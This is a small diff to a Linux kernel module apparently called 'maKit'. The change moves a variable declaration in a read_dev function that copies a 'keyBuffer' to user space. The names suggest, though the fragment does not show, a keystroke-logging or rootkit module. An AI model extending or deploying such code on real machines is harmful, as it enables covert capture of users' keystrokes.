@@ -130,6 +130,7 @@ ssize_t read_dev(struct file *filp, char __user *buf, size_t count,
 	//printk(KERN_ALERT "maKit: read_dev executed!\n");
 	int key;
 	char* buffer;
+	int result;
 	key = 0;
 	buffer = keyBuffer;
 	while(*buffer != '\0'){
@@ -139,7 +140,7 @@ ssize_t read_dev(struct file *filp, char __user *buf, size_t count,
 	if(*posPtr || (key == 0)){
 		return 0;
 	}
-	int result = copy_to_user(buf, keyBuffer, key);
+	result = copy_to_user(buf, keyBuffer, key);
 	if(result){
 		return -EFAULT;
 	}
